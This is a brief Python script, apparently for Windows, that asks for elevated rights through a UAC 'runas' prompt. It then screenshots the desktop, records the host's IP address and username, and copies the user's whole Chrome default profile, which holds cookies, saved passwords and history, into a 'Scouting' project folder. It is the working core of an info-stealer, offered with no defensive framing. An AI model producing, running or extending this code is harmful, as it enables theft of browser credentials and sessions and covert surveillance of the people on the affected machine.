import ctypes
import os
import getpass
import socket
import sys

import pyautogui
import shutil

ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                    __file__, None, 1)
screenshot = pyautogui.screenshot()
screenshot.save(r'C:\Users\loban\PycharmProjects\Scouting\shot.png')

ip = socket.gethostbyname(socket.getfqdn())
name = getpass.getuser()

source_dir = rf"C:\Users\{name}\AppData\Local\Google\Chrome\User Data\Default"
destination_dir = r'C:\Users\loban\PycharmProjects\Scouting\profile'
shutil.copytree(source_dir, destination_dir)
print(ip, name)